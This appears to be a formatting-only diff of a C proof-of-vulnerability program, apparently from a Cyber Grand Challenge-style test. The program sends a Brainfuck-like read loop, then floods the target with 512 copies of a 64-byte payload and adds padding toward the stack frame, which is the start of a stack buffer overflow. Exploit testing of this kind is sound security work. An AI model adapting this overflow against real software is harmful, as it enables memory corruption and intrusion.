@@ -33,15 +33,15 @@ int main(void) {
   delimited_read(STDIN, &line, &linesize, (unsigned char *)"\n", 1);
 
   // program to read one byte and inc ptr
-  char* read_loop = "+[>,]\n";
+  char *read_loop = "+[>,]\n";
   transmit_all(STDOUT, read_loop, strlen(read_loop));
 
-  char *payload = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!&";
+  char *payload =
+      "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!&";
   char term = 0;
 
   // Fill up data buffer
-  for (size_t i = 0; i < 512; i++)
-    transmit_all(STDOUT, payload, 64);
+  for (size_t i = 0; i < 512; i++) transmit_all(STDOUT, payload, 64);
 
   // Padding to stack frame
   transmit_all(STDOUT, payload, 23);
